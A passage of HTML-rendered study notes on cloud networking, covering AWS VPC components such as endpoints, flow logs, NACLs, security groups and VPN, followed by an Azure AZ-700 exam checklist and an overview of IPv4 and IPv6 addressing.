<p><i><ins> NAT Gateways/Instances </ins> </i> are only intended for EC2 instances to gain outbound access to the internet for things such as security updates .</p>
</li>
<li>
<p>NATs cannot/should not be used as Bastions</p>
</li>
<li>
<p>System Manager‚Äôs <b> Sessions Manager </b> replaces the need for Bastions</p>
  <img src="clouds/aws/saa-c03/images/VPC/bastion.jpg" width="50%" height="40%" />
</li>
</ul>
<hr>
<h2 id="direct-connect-1"><a class="header" href="#direct-connect-1">Direct Connect</a></h2>
<hr>
<ul>
<li>
<p>AWS Direct Connect is the AWS Solution for establishing dedicated network connections from on-premises locations to AWS</p>
</li>
<li>
<p>Very fast network lower Bandwidth 50M-500M or Higher bandwidth 1GB or 10GB</p>
</li>
<li>
<p>Helps reduce network costs and increase bandwidth throughput (great for high traffic networks)</p>
</li>
<li>
<p>Provides a more consistent network experience than a typical internet based connection(reliable and secure)</p>
  <img src="clouds/aws/saa-c03/images/VPC/direct-connect.jpg" width="50%" height="40%" />
</li>
</ul>
<hr>
<h2 id="vpc-endpoints-1"><a class="header" href="#vpc-endpoints-1">VPC Endpoints</a></h2>
<hr>
<ul>
<li>
<p>{ <b> Think of a secret tunnel where you don‚Äôt have tp leave the AWS network</b>}</p>
</li>
<li>
<p>VPC Endpoints allow you to privately connect your VPC to other AWS services, and VPC endpoint services</p>
</li>
<li>
<p>There are two types of VPC Endpoints</p>
<ol>
<li>Interface endpoints</li>
<li>Gateway Endpoints</li>
</ol>
</li>
<li>
<p>Eliminates the need for an <b> <ins>Internet Gateway, NAT device, VPN connection or AWS Direct Connect </ins></b> connections</p>
</li>
<li>
<p>Instances in the VPC <ins> do not require a public IP address </ins> to communicate with service resources</p>
</li>
<li>
<p>Traffic between your VPC and other services <ins> does not leave the AWS network</ins></p>
</li>
<li>
<p><b> Horizontally scaled,redundant and highly available </b> VPC component</p>
</li>
<li>
<p>Allows secure communication between instances and services <b> without adding availability risks or bandwidth constraints </b> on your traffic</p>
  <img src="clouds/aws/saa-c03/images/VPC/vpc-endpoints.jpg" width="50%" height="40%" />
</li>
</ul>
<hr>
<h2 id="interface-endpoints"><a class="header" href="#interface-endpoints">Interface Endpoints</a></h2>
<hr>
<ul>
<li>Interface Endpoints are ELastic Network Interfaces (ENI) with a private IP address. They serve as an entry point for traffic going to a supported service
<ul>
<li>Interface Endpoints are powered by AWS PrivateLink</li>
<li>Access services hosted on AWS easily and securely by keeping your network traffic within the AWS network
<ul>
<li>~$7.5/mo
<ul>
<li>Pricing per VPC endpoint per AZ ($/hour) 0.01</li>
<li>Pricing per GB data processed ($) 0.01</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Interface Endpoints support the following AWS services
<ul>
<li>API GATeway</li>
<li>CloudFormation</li>
<li>CloudWatch</li>
<li>Kinesis</li>
<li>SageMaker</li>
<li>CodeBuild</li>
<li>AWS COnfig</li>
<li>EC2 API</li>
<li>ELB API</li>
<li>AWS KMS</li>
<li>Secrets Manager</li>
<li>Security Token Service</li>
<li>Service Catalog</li>
<li>SNS
-SQS</li>
<li>Systems Manager</li>
<li>Marketplace Partner Services</li>
<li>Endpoint Services in other AWS accounts</li>
</ul>
</li>
</ul>
<hr>
<h2 id="vpc-gateway-endpoints"><a class="header" href="#vpc-gateway-endpoints">VPC Gateway Endpoints</a></h2>
<hr>
<ul>
<li>A Gateway Endpoint is a gateway that is a target for a specific route in your route table, used for traffic destined for a supported AWS service.</li>
<li>To create a Gateway Endpoint, you must specify the VPC in which you want to create the endpoint, and the service to which you want to establish the connection</li>
<li>AWS Gateway Endpoint currently supports 2 services
<ul>
<li>Amazon S3</li>
<li>DynamoDB</li>
</ul>
</li>
</ul>
<hr>
<h2 id="vpc-flow-logs-1"><a class="header" href="#vpc-flow-logs-1">VPC Flow Logs</a></h2>
<hr>
<ul>
<li>
<p><b> VPC FLow Logs </b> allow you to capture <b> IP Traffic information </b> in-and-out of Network Interfaces withinn your VPC</p>
</li>
<li>
<p>Network Interfaces within your VPC</p>
</li>
<li>
<p>Flow Logs can be created for</p>
<ol>
<li>VPC</li>
<li>Subnets</li>
<li>Network Interface</li>
</ol>
</li>
<li>
<p>All log data is stored using Amazon <b> Cloudwatch Logs </b></p>
</li>
<li>
<p>After a Flow Log is created it can be viewed in details within CloudWatch Logs</p>
</li>
<li>
<p>[version][account-id][interface-id][srcaddr][dstaddr][srcport][destport][protocol][packets][bytes][start][end][action][log-status]</p>
</li>
<li>
<p>2 123456789010 eni-abc123de 172.31.16.139 172.31.16.21 20641 22 6 20 4249 1418530010 1418530070 ACCEPT OK</p>
<ul>
<li><b> Version </b> The VPC flow logs version</li>
<li><b> account- id </b> The AWS account ID for the flow log</li>
<li><b> interface-id </b> The ID of the network interface for which the traffic is recorded</li>
<li><b> srcaddr </b> The source IPv4 or Ipv6 address. The IPv4 address of the netwrok interface is always its private Ipv4 address</li>
<li><b> dstaddr </b> The destination IPv4 or Ipv6 address. The IPv4 address of the netwrok interface is always its private IPv4 address</li>
<li><b> srcport </b> The source port of the traffic</li>
<li><b> dstport </b> The destination port of the traffic</li>
<li><b> protocol </b> The IANA protocol number of the traffic. For more information, see assigned Internet  Protocol Numbers.</li>
<li><b> Packets </b> The number of packets transferred during the capture window</li>
<li><b> Bytes </b> The number of bytes transferred during the capture window</li>
<li><b> start </b> The time, in Unix Seconds of the start of the capture window</li>
<li><b> end </b> The time, in Unix seconds, of the end of the capture window</li>
<li><b> action </b> The action associated with the traffic
<ul>
<li>ACCEPT: The recorded traffic was permitted by the security groups or network ACls</li>
<li>REJECT: The recorded traffic was not permitted by the security groups or network ACls</li>
</ul>
</li>
<li><b> log-status </b> The logging status of the flow log
<ul>
<li>OK: Data is logging normally to the chosen destinations</li>
<li>NODATA: There was no network traffic to or from the network interface during the capture window</li>
<li>SKIPDATA: SOme flow log records were skipped during the capture window. This may be because of an internal capacity constraint or an internal error</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="nacls"><a class="header" href="#nacls">NACLs</a></h2>
<hr>
<ul>
<li>
<p>Network Access Control List (NACLs)</p>
</li>
<li>
<p>An (optional) layer of Security that acts as a  <b><ins>firewall for controlling traffic in and out of subnet(s) </ins></b>.</p>
</li>
<li>
<p>NACLs acts as a virtual firewall at the subnet level</p>
  <img src="clouds/aws/saa-c03/images/VPC/nacl.jpg" width="50%" height="40%" />
</li>
<li>
<p>VPCs automatically get a default NACL</p>
</li>
<li>
<p>Subnets are associated with NACLs. Subnets can only belong to a single NACL</p>
</li>
<li>
<p>Each NACL contains a set of rules that can allow or deny traffic into (inbound) and out of (outbound)</p>
</li>
<li>
<p>Rule # determines the order of evaluation. From lowest to highest. The highest rule # can be 32766 and its recommended to work in 10 or 100 increments.</p>
</li>
<li>
<p>You can allow or deny traffic. You could block a single IP address (You can‚Äôt do this without Security Groups)</p>
</li>
<li>
<p><b> Use Case </b></p>
<ul>
<li>
<p>We determine there is a malicious actor at a specific IP address is trying to access our instances so we block their IP</p>
</li>
<li>
<p>We never need to SSH into instances so we add a DENY for these subnets. This is just an additional measure in case our security groups SSH port was left open .</p>
  <img src="clouds/aws/saa-c03/images/VPC/nacl-usecase.jpg" width="50%" height="40%" />
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="security-groups-3"><a class="header" href="#security-groups-3">Security Groups</a></h2>
<hr>
<ul>
<li>
<p><b> Security Groups </b></p>
<ul>
<li>A virtual <b> firewall </b> that controls the traffic to and from EC2 Instances</li>
</ul>
</li>
<li>
<p>Security Groups are associated with Ec2 instances</p>
</li>
<li>
<p>Each Security Group contains a set of rules that filter traffic coming into (inbound) and out of (outbound) Ec2 instances.</p>
</li>
<li>
<p>There are no ‚ÄòDeny‚Äô rules. All traffic is blocked by default unless a rule specifically allows it.</p>
</li>
<li>
<p>Multiple Instances across multiple subnets can belong to a Security Group.</p>
  <img src="clouds/aws/saa-c03/images/VPC/security-groups.jpg" width="50%" height="40%" />
</li>
<li>
<p>Use Case:</p>
<ul>
<li>You can specify the source to be an IP range or a specific ip (/32 is a specific IP address)</li>
<li>You can specify the source to be another security group</li>
<li>An instance can belong to multiple Security Groups, and rules are permissive (instead of restrictive) Meaning if you have one  Security group which has no allow and you add an allow to another than it will allow.</li>
</ul>
</li>
<li>
<p>Limits:</p>
<ul>
<li>You can have upto 10,000 Security Groups in a Region (default is 2,500)</li>
<li>You can have 60 inbound rules and 60 outbound rules per security Group
-16 Security Groups per Elastic Network Interface (ENI) (default is 5)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="nacl-vs-security-groups"><a class="header" href="#nacl-vs-security-groups">NACL v/s Security Groups</a></h2>
<hr><img src="clouds/aws/saa-c03/images/VPC/nacl_security_groups.png" width="77%" height="40%" />
<img src="clouds/aws/saa-c03/images/VPC/security-groups-vs-nacl.jpg" width="77%" />
<img src="clouds/aws/saa-c03/images/VPC/nacl-vs-security-groups.jpg" width="77%" height="40%" />
<hr>
<h2 id="site-to-site-vpn--virtual-private-gateway-and-customer-gateway"><a class="header" href="#site-to-site-vpn--virtual-private-gateway-and-customer-gateway">Site to Site VPN , Virtual Private Gateway and Customer Gateway</a></h2>
<hr><img src="clouds/aws/saa-c03/images/VPC/site-to-site-vpn.jpg" width="77%" height="40%" />
<ul>
<li><strong> Virtual Private Gateway (VGW) </strong>
<ul>
<li>VPN concentrator on the AWS side of the VPN connection</li>
<li>VGW is created and attached to the VPC from which you want to create Site-to-Site VPN connection</li>
</ul>
</li>
<li><strong> Customer Gateway Device (On-Premises) </strong>
<ul>
<li>What IP address to use?
<ul>
<li>Public Internet-routable IP address for your Customer Gateway device</li>
<li>If it‚Äôs behind a NAT device that‚Äôs enabled for NAT traversal (NAT-T), use the public IP address of the NAT device
<img src="clouds/aws/saa-c03/images/VPC/customer-gateway-device.jpg" width="77%" /></li>
<li><strong> Important Step: </strong>
<ins>enable Route Propagation for the Virtual Private Gateway in the route table </ins> that is associated with your subnets</li>
<li><ins> If you need to ping your EC2 instances </ins> from on-premises, make sure you add the <strong>ICMP protocol </strong>on the inbound of your security groups</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="secrets-manager-1"><a class="header" href="#secrets-manager-1">Secrets Manager</a></h2>
<hr>
<ul>
<li>Helps to <ins> <i> manage, retrieve and rotate database credentials, application credentials, OAuth tokens, API keys and other secrets throughout their lifecycles
</i></ins></li>
<li>Helps to <ins> improve security posture </ins>, because you no longer need hard-coded credentials in application source code.
<ul>
<li>Storing the credentials in Secrets Manager <ins> helps to avoid possible compromise by anyone who can inspect the application </ins> or the components.</li>
<li><ins>Replace hard-coded credentials </ins> with a runtime call to the Secrets Manager service to retrieve credentials with a runtime call to the Secrets Manager service to retrieve credentials dynamically when you need them.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure"><a class="header" href="#azure">Azure</a></h1>
<p>Notes related to Microsoft Azure.</p>
<h2 id="directory-map-4"><a class="header" href="#directory-map-4">Directory Map</a></h2>
<ul>
<li><a href="clouds/azure/az700">az700</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="core-networking-infrastructure-checklist"><a class="header" href="#core-networking-infrastructure-checklist">Core Networking Infrastructure Checklist</a></h1>
<h2 id="design-and-implement-private-ip-addressing-for-azure-resources"><a class="header" href="#design-and-implement-private-ip-addressing-for-azure-resources">Design and Implement Private IP Addressing for Azure Resources</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Plan and implement network segmentation and address spaces</li>
<li><input disabled="" type="checkbox" checked=""> Create a virtual network (VNet)</li>
<li><input disabled="" type="checkbox" checked=""> Plan and configure subnetting for services, including VNet gateways, private endpoints, firewalls, application gateways, VNet-integrated platform services, and Azure Bastion</li>
<li><input disabled="" type="checkbox" checked=""> Plan and configure subnet delegation</li>
<li><input disabled="" type="checkbox" checked=""> Create a prefix for public IP addresses</li>
<li><input disabled="" type="checkbox" checked=""> Choose when to use a public IP address prefix</li>
<li><input disabled="" type="checkbox" checked=""> Plan and implement a custom public IP address prefix (bring your own IP)</li>
<li><input disabled="" type="checkbox" checked=""> Create a new public IP address</li>
<li><input disabled="" type="checkbox" checked=""> Associate public IP addresses to resources</li>
</ul>
<h2 id="design-and-implement-name-resolution"><a class="header" href="#design-and-implement-name-resolution">Design and Implement Name Resolution</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Design name resolution inside a VNet</li>
<li><input disabled="" type="checkbox" checked=""> Configure DNS settings for a VNet</li>
<li><input disabled="" type="checkbox" checked=""> Design public DNS zones</li>
<li><input disabled="" type="checkbox" checked=""> Design private DNS zones</li>
<li><input disabled="" type="checkbox" checked=""> Configure a public or private DNS zone</li>
<li><input disabled="" type="checkbox" checked=""> Link a private DNS zone to a VNet</li>
</ul>
<h2 id="design-and-implement-vnet-connectivity-and-routing"><a class="header" href="#design-and-implement-vnet-connectivity-and-routing">Design and Implement VNet Connectivity and Routing</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Design service chaining, including gateway transit</li>
<li><input disabled="" type="checkbox" checked=""> Design virtual private network (VPN) connectivity between VNets</li>
<li><input disabled="" type="checkbox" checked=""> Implement VNet peering</li>
<li><input disabled="" type="checkbox" checked=""> Design and implement user-defined routes (UDRs)</li>
<li><input disabled="" type="checkbox" checked=""> Associate a route table with a subnet</li>
<li><input disabled="" type="checkbox" checked=""> Configure forced tunneling</li>
<li><input disabled="" type="checkbox"> Diagnose and resolve routing issues</li>
<li><input disabled="" type="checkbox"> Design and implement Azure Route Server</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for a Virtual Network NAT gateway</li>
<li><input disabled="" type="checkbox" checked=""> Implement a NAT gateway</li>
</ul>
<h2 id="monitor-networks"><a class="header" href="#monitor-networks">Monitor Networks</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Configure monitoring, network diagnostics, and logs in Azure Network Watcher</li>
<li><input disabled="" type="checkbox" checked=""> Monitor and repair network health using Azure Network Watcher</li>
<li><input disabled="" type="checkbox" checked=""> Activate and monitor distributed denial-of-service (DDoS) protection</li>
<li><input disabled="" type="checkbox"> Activate and monitor Microsoft Defender for DNS</li>
</ul>
<h1 id="design-implement-and-manage-connectivity-services-checklist"><a class="header" href="#design-implement-and-manage-connectivity-services-checklist">Design, Implement, and Manage Connectivity Services Checklist</a></h1>
<h2 id="design-implement-and-manage-a-site-to-site-vpn-connection"><a class="header" href="#design-implement-and-manage-a-site-to-site-vpn-connection">Design, Implement, and Manage a Site-to-Site VPN Connection</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Design a site-to-site VPN connection, including for high availability</li>
<li><input disabled="" type="checkbox" checked=""> Select an appropriate VNet gateway SKU for site-to-site VPN requirements</li>
<li><input disabled="" type="checkbox" checked=""> Implement a site-to-site VPN connection</li>
<li><input disabled="" type="checkbox" checked=""> Identify when to use a policy-based VPN versus a route-based VPN connection</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure an IPsec/IKE policy</li>
<li><input disabled="" type="checkbox" checked=""> Diagnose and resolve virtual network gateway connectivity issues</li>
<li><input disabled="" type="checkbox" checked=""> Implement Azure Extended Network</li>
</ul>
<h2 id="design-implement-and-manage-a-point-to-site-vpn-connection"><a class="header" href="#design-implement-and-manage-a-point-to-site-vpn-connection">Design, Implement, and Manage a Point-to-Site VPN Connection</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Select an appropriate virtual network gateway SKU for point-to-site VPN requirements</li>
<li><input disabled="" type="checkbox" checked=""> Select and configure a tunnel type</li>
<li><input disabled="" type="checkbox" checked=""> Select an appropriate authentication method</li>
<li><input disabled="" type="checkbox" checked=""> Configure RADIUS authentication</li>
<li><input disabled="" type="checkbox" checked=""> Configure certificate-based authentication</li>
<li><input disabled="" type="checkbox" checked=""> Configure authentication using Azure Active Directory (Azure AD), part of Microsoft Entra</li>
<li><input disabled="" type="checkbox" checked=""> Implement a VPN client configuration file</li>
<li><input disabled="" type="checkbox" checked=""> Diagnose and resolve client-side and authentication issues</li>
<li><input disabled="" type="checkbox"> Specify Azure requirements for Always On authentication</li>
<li><input disabled="" type="checkbox"> Specify Azure requirements for Azure Network Adapter</li>
</ul>
<h2 id="design-implement-and-manage-azure-expressroute"><a class="header" href="#design-implement-and-manage-azure-expressroute">Design, Implement, and Manage Azure ExpressRoute</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Select an ExpressRoute connectivity model</li>
<li><input disabled="" type="checkbox"> Select an appropriate ExpressRoute SKU and tier</li>
<li><input disabled="" type="checkbox" checked=""> Design and implement ExpressRoute to meet requirements, including cross-region connectivity, redundancy, and disaster recovery</li>
<li><input disabled="" type="checkbox" checked=""> Design and implement ExpressRoute options, including Global Reach, FastPath, and ExpressRoute Direct</li>
<li><input disabled="" type="checkbox" checked=""> Choose between private peering only, Microsoft peering only, or both</li>
<li><input disabled="" type="checkbox" checked=""> Configure private peering</li>
<li><input disabled="" type="checkbox" checked=""> Configure Microsoft peering</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure an ExpressRoute gateway</li>
<li><input disabled="" type="checkbox" checked=""> Connect a virtual network to an ExpressRoute circuit</li>
<li><input disabled="" type="checkbox" checked=""> Recommend a route advertisement configuration</li>
<li><input disabled="" type="checkbox" checked=""> Configure encryption over ExpressRoute</li>
<li><input disabled="" type="checkbox" checked=""> Implement Bidirectional Forwarding Detection</li>
<li><input disabled="" type="checkbox" checked=""> Diagnose and resolve ExpressRoute connection issues</li>
</ul>
<h2 id="design-and-implement-an-azure-virtual-wan-architecture"><a class="header" href="#design-and-implement-an-azure-virtual-wan-architecture">Design and Implement an Azure Virtual WAN Architecture</a></h2>
<ul>
<li><input disabled="" type="checkbox"> Select a Virtual WAN SKU</li>
<li><input disabled="" type="checkbox"> Design a Virtual WAN architecture, including selecting types and services</li>
<li><input disabled="" type="checkbox" checked=""> Create a hub in Virtual WAN</li>
<li><input disabled="" type="checkbox"> Choose an appropriate scale unit for each gateway type</li>
<li><input disabled="" type="checkbox"> Deploy a gateway into a Virtual WAN hub</li>
<li><input disabled="" type="checkbox"> Configure virtual hub routing</li>
<li><input disabled="" type="checkbox"> Create a network virtual appliance (NVA) in a virtual hub</li>
<li><input disabled="" type="checkbox"> Integrate a Virtual WAN hub with a third-party NVA</li>
</ul>
<h1 id="design-and-implement-application-delivery-services-checklist"><a class="header" href="#design-and-implement-application-delivery-services-checklist">Design and Implement Application Delivery Services Checklist</a></h1>
<h2 id="design-and-implement-an-azure-load-balancer"><a class="header" href="#design-and-implement-an-azure-load-balancer">Design and Implement an Azure Load Balancer</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Load Balancer</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Load Balancer</li>
<li><input disabled="" type="checkbox"> Choose an Azure Load Balancer SKU and tier</li>
<li><input disabled="" type="checkbox" checked=""> Choose between public and internal</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure an Azure Load Balancer</li>
<li><input disabled="" type="checkbox" checked=""> Implement a load balancing rule</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure inbound NAT rules</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure explicit outbound rules, including SNAT</li>
</ul>
<h2 id="design-and-implement-azure-application-gateway"><a class="header" href="#design-and-implement-azure-application-gateway">Design and Implement Azure Application Gateway</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Application Gateway</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Application Gateway</li>
<li><input disabled="" type="checkbox" checked=""> Create a back-end pool</li>
<li><input disabled="" type="checkbox" checked=""> Configure health probes</li>
<li><input disabled="" type="checkbox" checked=""> Configure listeners</li>
<li><input disabled="" type="checkbox" checked=""> Configure routing rules</li>
<li><input disabled="" type="checkbox" checked=""> Configure HTTP settings</li>
<li><input disabled="" type="checkbox" checked=""> Configure Transport Layer Security (TLS)</li>
<li><input disabled="" type="checkbox" checked=""> Configure rewrite sets</li>
</ul>
<h2 id="design-and-implement-azure-front-door"><a class="header" href="#design-and-implement-azure-front-door">Design and Implement Azure Front Door</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Front Door</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Front Door</li>
<li><input disabled="" type="checkbox"> Choose an appropriate tier</li>
<li><input disabled="" type="checkbox"> Configure an Azure Front Door, including routing, origins, and endpoints</li>
<li><input disabled="" type="checkbox"> Configure SSL termination and end-to-end SSL encryption</li>
<li><input disabled="" type="checkbox"> Configure caching</li>
<li><input disabled="" type="checkbox"> Configure traffic acceleration</li>
<li><input disabled="" type="checkbox"> Implement rules, URL rewrite, and URL redirect</li>
<li><input disabled="" type="checkbox"> Secure an origin using Azure Private Link in Azure Front Door</li>
</ul>
<h2 id="design-and-implement-azure-traffic-manager"><a class="header" href="#design-and-implement-azure-traffic-manager">Design and Implement Azure Traffic Manager</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Traffic Manager</li>
<li><input disabled="" type="checkbox" checked=""> Configure a routing method</li>
<li><input disabled="" type="checkbox" checked=""> Configure endpoints</li>
</ul>
<h1 id="design-and-implement-private-access-to-azure-services-checklist"><a class="header" href="#design-and-implement-private-access-to-azure-services-checklist">Design and Implement Private Access to Azure Services Checklist</a></h1>
<h2 id="design-and-implement-azure-private-link-service-and-azure-private-endpoints"><a class="header" href="#design-and-implement-azure-private-link-service-and-azure-private-endpoints">Design and Implement Azure Private Link Service and Azure Private Endpoints</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Plan an Azure Private Link service</li>
<li><input disabled="" type="checkbox" checked=""> Create a Private Link service</li>
<li><input disabled="" type="checkbox" checked=""> Integrate a Private Link service with DNS</li>
<li><input disabled="" type="checkbox" checked=""> Plan private endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Create private endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Configure access to Azure resources using private endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Connect on-premises clients to a private endpoint</li>
<li><input disabled="" type="checkbox" checked=""> Integrate a private endpoint with DNS</li>
</ul>
<h2 id="design-and-implement-service-endpoints"><a class="header" href="#design-and-implement-service-endpoints">Design and Implement Service Endpoints</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Choose when to use a service endpoint</li>
<li><input disabled="" type="checkbox" checked=""> Create service endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Configure service endpoint policies</li>
<li><input disabled="" type="checkbox" checked=""> Configure access to service endpoints</li>
</ul>
<h1 id="secure-network-connectivity-to-azure-resources-checklist"><a class="header" href="#secure-network-connectivity-to-azure-resources-checklist">Secure Network Connectivity to Azure Resources Checklist</a></h1>
<h2 id="implement-and-manage-network-security-groups-nsgs"><a class="header" href="#implement-and-manage-network-security-groups-nsgs">Implement and Manage Network Security Groups (NSGs)</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Create a network security group (NSG)</li>
<li><input disabled="" type="checkbox" checked=""> Associate an NSG to a resource</li>
<li><input disabled="" type="checkbox" checked=""> Create an application security group (ASG)</li>
<li><input disabled="" type="checkbox" checked=""> Associate an ASG to a network interface card (NIC)</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure NSG rules</li>
<li><input disabled="" type="checkbox" checked=""> Interpret NSG flow logs</li>
<li><input disabled="" type="checkbox" checked=""> Validate NSG flow rules</li>
<li><input disabled="" type="checkbox" checked=""> Verify IP flow</li>
<li><input disabled="" type="checkbox" checked=""> Configure an NSG for remote server administration, including Azure Bastion</li>
</ul>
<h2 id="design-and-implement-azure-firewall-and-azure-firewall-manager"><a class="header" href="#design-and-implement-azure-firewall-and-azure-firewall-manager">Design and Implement Azure Firewall and Azure Firewall Manager</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Firewall</li>
<li><input disabled="" type="checkbox"> Select an appropriate Azure Firewall SKU</li>
<li><input disabled="" type="checkbox" checked=""> Design an Azure Firewall deployment</li>
<li><input disabled="" type="checkbox" checked=""> Create and implement an Azure Firewall deployment</li>
<li><input disabled="" type="checkbox" checked=""> Configure Azure Firewall rules</li>
<li><input disabled="" type="checkbox" checked=""> Create and implement Azure Firewall Manager policies</li>
<li><input disabled="" type="checkbox" checked=""> Create a secure hub by deploying Azure Firewall inside an Azure Virtual WAN hub</li>
</ul>
<h2 id="design-and-implement-a-web-application-firewall-waf-deployment"><a class="header" href="#design-and-implement-a-web-application-firewall-waf-deployment">Design and Implement a Web Application Firewall (WAF) Deployment</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of WAF</li>
<li><input disabled="" type="checkbox" checked=""> Design a WAF deployment</li>
<li><input disabled="" type="checkbox" checked=""> Configure detection or prevention mode</li>
<li><input disabled="" type="checkbox" checked=""> Configure rule sets for WAF on Azure Front Door</li>
<li><input disabled="" type="checkbox" checked=""> Configure rule sets for WAF on Application Gateway</li>
<li><input disabled="" type="checkbox" checked=""> Implement a WAF policy</li>
<li><input disabled="" type="checkbox" checked=""> Associate a WAF policy</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-and-implement-core-network-infra"><a class="header" href="#design-and-implement-core-network-infra">Design-and-implement-core-network-infra</a></h1>
<h2 id="directory-map-5"><a class="header" href="#directory-map-5">Directory Map</a></h2>
<ul>
<li><a href="#ipv4-and-ipv6-addressing">ip-addressing</a></li>
<li><a href="#azure-dns">name-resolution</a></li>
<li><a href="#azure-virtual-network-nat">nat</a></li>
<li><a href="#subnets">subnets</a></li>
<li><a href="#virtual-machine-scale-sets">vmss</a></li>
<li><a href="#azure-virtual-network-vnet">vnet</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ipv4-and-ipv6-addressing"><a class="header" href="#ipv4-and-ipv6-addressing">IPv4 and IPv6 Addressing</a></h1>
<h2 id="ipv4-addressing"><a class="header" href="#ipv4-addressing">IPv4 Addressing</a></h2>
<p><strong>Definition:</strong>
IPv4 (Internet Protocol version 4) is the fourth version of the Internet Protocol (IP). It is the most widely used IP version for connecting devices to the internet.</p>
<p><strong>Format:</strong></p>
<ul>
<li>IPv4 addresses are 32-bit numerical labels.</li>
<li>Represented in decimal format as four octets separated by periods (e.g., 192.168.1.1).</li>
<li>Each octet can range from 0 to 255.</li>
</ul>
<p><strong>Classes:</strong></p>
<ul>
<li><strong>Class A:</strong> <code>0.0.0.0</code> to <code>127.255.255.255</code> (large networks)</li>
<li><strong>Class B:</strong> <code>128.0.0.0</code> to <code>191.255.255.255</code> (medium-sized networks)</li>
<li><strong>Class C:</strong> <code>192.0.0.0</code> to <code>223.255.255.255</code> (small networks)</li>
<li><strong>Class D:</strong> <code>224.0.0.0</code> to <code>239.255.255.255</code> (multicast)</li>
<li><strong>Class E:</strong> <code>240.0.0.0</code> to <code>255.255.255.255</code> (experimental)</li>
</ul>
<p><strong>Special Addresses:</strong></p>
<ul>
<li><strong>Private Addresses:</strong>
<ul>
<li>Class A: <code>10.0.0.0</code> to <code>10.255.255.255</code></li>
<li>Class B: <code>172.16.0.0</code> to <code>172.31.255.255</code></li>
<li>Class C: <code>192.168.0.0</code> to <code>192.168.255.255</code></li>
</ul>
</li>
<li><strong>Loopback Address:</strong> <code>127.0.0.1</code></li>
<li><strong>Broadcast Address:</strong> <code>255.255.255.255</code></li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li>Limited address space (about 4.3 billion addresses).</li>
<li>Exhaustion of available addresses.</li>
</ul>
<h2 id="ipv6-addressing"><a class="header" href="#ipv6-addressing">IPv6 Addressing</a></h2>
<p><strong>Definition:</strong>
IPv6 (Internet Protocol version 6) is the successor to IPv4, designed to address the limitations and address exhaustion of IPv4.</p>
<p><strong>Format:</strong></p>
<ul>
<li>IPv6 addresses are 128-bit numerical labels.</li>
<li>Represented in hexadecimal format as eight groups of four hexadecimal digits separated by colons (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334).</li>
<li>Leading zeros in each group can be omitted, and consecutive groups of zeros can be replaced with ‚Äú::‚Äù (e.g., 2001:db8:85a3::8a2e:370:7334).</li>
</ul>
<p><strong>Special Addresses:</strong></p>
<ul>
<li><strong>Unicast Addresses:</strong> Identifies a single interface.
<ul>
<li><strong>Global Unicast:</strong> Globally unique (e.g., 2000::/3).</li>
<li><strong>Link-Local:</strong> Used within a single network segment (e.g., fe80::/10).</li>
</ul>
</li>
<li><strong>Multicast Addresses:</strong> Identifies multiple interfaces (e.g., ff00::/8).</li>
<li><strong>Anycast Addresses:</strong> Assigned to multiple interfaces, with packets delivered to the nearest one.</li>
<li><strong>Loopback Address:</strong> <code>::1</code></li>
<li><strong>Unique Local Addresses (ULA):</strong> <code>fc00::/7</code></li>
</ul>
<p><strong>Advantages:</strong></p>
<ul>
<li>Vast address space (2^128 addresses).</li>
<li>Improved routing efficiency and hierarchical addressing.</li>
<li>Simplified packet header for better performance.</li>
<li>Enhanced security features (mandatory IPsec support).</li>
<li>Auto-configuration capabilities.</li>
</ul>
<h2 id="comparison"><a class="header" href="#comparison">Comparison</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>IPv4</th><th>IPv6</th></tr>
</thead>
<tbody>
<tr><td>Address Length</td><td>32 bits</td><td>128 bits</td></tr>
<tr><td>Address Format</td><td>Decimal (e.g., 192.168.1.1)</td><td>Hexadecimal (e.g., 2001:db8::1)</td></tr>
<tr><td>Address Space</td><td>~4.3 billion addresses</td><td>Virtually unlimited (2^128 addresses)</td></tr>
